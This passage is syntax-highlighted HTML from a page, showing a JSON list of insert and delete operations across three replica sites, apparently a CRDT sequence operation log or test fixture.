</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:29&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:16&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;D&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 16
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:45&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:12&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;j&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 45
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:22&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:57&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;R&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 2
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:12&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:43&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;l&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 43
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;E&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 8
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:22&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 22
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:33&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;l&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 33
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:21&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:39&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:20&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:56&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 56
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:55&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:26&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;m&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 26
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:16&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;j&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 16
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:19&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 19
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:33&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;b&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 33
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:15&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 15
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:26&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 26
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:45&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 45
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:18&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;M&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 18
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:49&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 49
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:46&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:13&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 13
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:30&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:23&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:40&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:38&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;K&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 38
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:27&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;#&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 27
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:44&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:46&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;W&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 46
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:25&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:37&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;r&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 37
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:16&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:14&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;f&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 14
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:49&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:12&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;☆&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 12
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:34&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;t&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 34
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:38&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;u&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 38
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:27&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:32&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:20&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 20
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:22&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 22
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:43&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:18&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;w&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 18
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:48&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;d&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 48
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:32&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:34&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:22&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:44&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;I&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 44
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 5
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:27&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:20&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:15&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
